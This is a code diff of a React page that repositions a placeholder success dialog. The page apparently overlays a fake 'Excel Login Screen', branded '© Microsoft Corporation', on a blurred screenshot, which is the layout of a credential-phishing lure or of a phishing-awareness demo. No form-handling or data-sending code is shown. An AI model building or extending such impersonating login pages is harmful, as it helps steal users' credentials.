@@ -21,31 +21,6 @@ export default function Home() {
       {/* Blurred Image */}
       <img id="blurredImage" src={imageUrl} alt="Blurred screenshot" />
 
-      <AlertDialog open={showDialog} onOpenChange={setShowDialog}>
-        <AlertDialogContent className="sm:max-w-sm">
-          <AlertDialogHeader className="items-center">
-            <div className="flex h-12 w-12 items-center justify-center rounded-full border-4 border-green-100 bg-green-50 mb-4">
-              <CheckCircle2 className="h-8 w-8 text-green-600" />
-            </div>
-            <AlertDialogTitle>
-              Success Message Title
-            </AlertDialogTitle>
-            <AlertDialogDescription>
-              Well done, you pressed a button
-            </AlertDialogDescription>
-          </AlertDialogHeader>
-          <AlertDialogFooter>
-            <AlertDialogAction 
-              onClick={() => setShowDialog(false)}
-              className="w-full bg-blue-500 hover:bg-blue-600 text-white"
-              style={{backgroundColor: '#60a5fa'}}
-              >
-              OK
-            </AlertDialogAction>
-          </AlertDialogFooter>
-        </AlertDialogContent>
-      </AlertDialog>
-
       {/* Login Overlay */}
       <div className="login-overlay" role="main" aria-label="Excel Login Screen">
         
@@ -73,6 +48,31 @@ export default function Home() {
           <small>© Microsoft Corporation</small>
         </form>
       </div>
+
+      <AlertDialog open={showDialog} onOpenChange={setShowDialog}>
+        <AlertDialogContent className="sm:max-w-md">
+          <AlertDialogHeader className="items-center">
+            <div className="flex h-12 w-12 items-center justify-center rounded-full border-4 border-green-100 bg-green-50 mb-4">
+              <CheckCircle2 className="h-8 w-8 text-green-600" />
+            </div>
+            <AlertDialogTitle>
+              Success Message Title
+            </AlertDialogTitle>
+            <AlertDialogDescription>
+              Well done, you pressed a button
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <AlertDialogFooter>
+            <AlertDialogAction 
+              onClick={() => setShowDialog(false)}
+              className="w-full bg-blue-500 hover:bg-blue-600 text-white"
+              style={{backgroundColor: '#60a5fa'}}
+              >
+              OK
+            </AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
     </>
   );
 }
